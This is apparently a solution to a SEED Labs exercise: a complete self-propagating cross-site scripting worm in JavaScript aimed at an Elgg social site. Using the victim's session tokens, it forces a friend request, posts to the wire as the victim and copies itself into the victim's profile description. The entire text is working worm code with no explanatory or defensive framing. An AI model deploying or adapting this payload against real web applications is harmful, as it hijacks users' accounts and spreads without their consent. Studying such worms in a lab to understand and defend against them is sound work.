<script id="worm" type="text/javascript">

    window.onload = function () {
    var user_guid = elgg.session.user.guid;
    var page_owner_guid = elgg.page_owner.guid;

    if (user_guid != page_owner_guid && user_guid != 59) {

        var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.

    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + page_owner_guid + ts + ts + token + token;

    //Create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();

    sendurl = "http://www.seed-server.com/action/thewire/add"; //FILL IN
    content = ts + token + "&guid=" + user_guid + "&body=" + elgg.session.user.url

    Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);


    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

sendurl = "	http://www.seed-server.com/action/profile/edit"; //FILL IN
content = token + ts + "&description=" + wormCode + "&" + "guid=" + user_guid;

Ajax = null;
Ajax = new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Host", "www.seed-server.com");
Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
Ajax.send(content);
    }

}
</script >